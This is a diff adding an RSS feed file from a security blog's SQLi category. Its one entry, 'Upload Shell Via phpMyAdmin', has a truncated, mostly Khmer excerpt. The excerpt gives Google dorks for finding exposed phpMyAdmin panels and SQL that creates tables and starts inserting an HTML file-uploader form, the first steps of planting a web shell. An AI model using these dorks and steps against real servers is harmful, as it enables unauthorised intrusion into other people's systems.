@@ -1,0 +1,73 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" 
+  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
+  xmlns:dc="http://purl.org/dc/elements/1.1/" 
+  xmlns:atom="http://www.w3.org/2005/Atom" 
+  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
+  xmlns:media="http://search.yahoo.com/mrss/">
+  <channel>
+    <title>SQLi on ThikLab - CyberSec</title>
+    <link>https://th1k.github.io/en/categories/sqli/</link>
+    <description>Recent content in SQLi on ThikLab - CyberSec</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <managingEditor>leangputthik@protonmail.com (Thik)</managingEditor>
+    <webMaster>leangputthik@protonmail.com (Thik)</webMaster>
+    <copyright><a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'><img alt='Creative Commons License' style='border-width:0;display:block;margin-left:auto;margin-right:auto;' src='https://i.creativecommons.org/l/by-sa/4.0/88x31.png' /></a>©2020 - 2024 All content is licensed under <a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'>CC BY-SA</a>.</copyright>
+    <lastBuildDate>Thu, 01 Apr 2021 10:01:06 +0700</lastBuildDate>
+    
+        <atom:link href="https://th1k.github.io/en/categories/sqli/index.xml" rel="self" type="application/rss+xml" />
+    
+
+      
+      <item>
+        <title>Upload Shell Via phpMyAdmin</title>
+        <link>https://th1k.github.io/en/posts/upload-shell-via-phpmyadmin/</link>
+        <pubDate>Thu, 01 Apr 2021 10:01:06 +0700</pubDate>
+        <author>leangputthik@protonmail.com (Thik)</author>
+        <atom:modified>Thu, 01 Apr 2021 10:01:06 +0700</atom:modified>
+        <guid>https://th1k.github.io/en/posts/upload-shell-via-phpmyadmin/</guid>
+        <description>Google Dorks  allinurl:index.php?db=information_schema allinurl:/read_dump.php?  SQL Query ចូលទៅកាន់ផ្ទាំង phpMyAdmin Database ហើយបង្កើត Database ថ្មីមួយ ឧ, &amp;ldquo;uploader&amp;rdquo; បន្ទាប់មកចុចត្រង់ផ្ទាំង SQL ហើយចម្លងចូលនូវកូដខាងក្រោមនេះ៖
+1 2 3  CREATETABLE`uploader`.`userform`(`track1`VARCHAR(1000)NOTNULL)ENGINE=MYISAM;   និងកូដខាងក្រោមនេះទៀត៖
+1 2 3  CREATETABLE`uploader`.`user_upload`(`track2`VARCHAR(1000)NOTNULL)ENGINE=MYISAM;   បន្ទាប់មកចូលទៅកាន់ Table ឈ្មោះថា user_upload ហើយចុចត្រង់ផ្ទាំង SQL និងចម្លងចូលនូវកូដខាងក្រោម៖
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  insertintouserformvalues(&amp;#39;&amp;lt;!DOCTYPE html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta http-equiv=&amp;#34;Content-Type&amp;#34; content=&amp;#34;text/html; charset=utf-8&amp;#34; /&amp;gt; &amp;lt;title&amp;gt;Uploader&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body bgcolor=&amp;#34;black&amp;#34;&amp;gt; &amp;lt;center&amp;gt; &amp;lt;div style=&amp;#34;color:white;margin-top:150px;&amp;#34;&amp;gt;&amp;lt;h1&amp;gt;Uploader&amp;lt;/h1&amp;gt;&amp;lt;/div&amp;gt; &amp;lt;div&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt; &amp;lt;form enctype=&amp;#34;multipart/form-data&amp;#34; action=&amp;#34;uploader.</description>
+        
+        <dc:creator>thik</dc:creator>
+        <media:content url="https://th1k.github.ioimages/feature3/sqli.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>fileupload</category>
+            
+          
+            
+              <category>google-dork</category>
+            
+          
+            
+              <category>phpmyadmin</category>
+            
+          
+        
+        
+          
+            
+              <category>SQLi</category>
+            
+          
+        
+        
+          
+            
+              <category>WebApp</category>
+            
+          
+        
+      </item>
+      
+
+    
+  </channel>
+</rss>
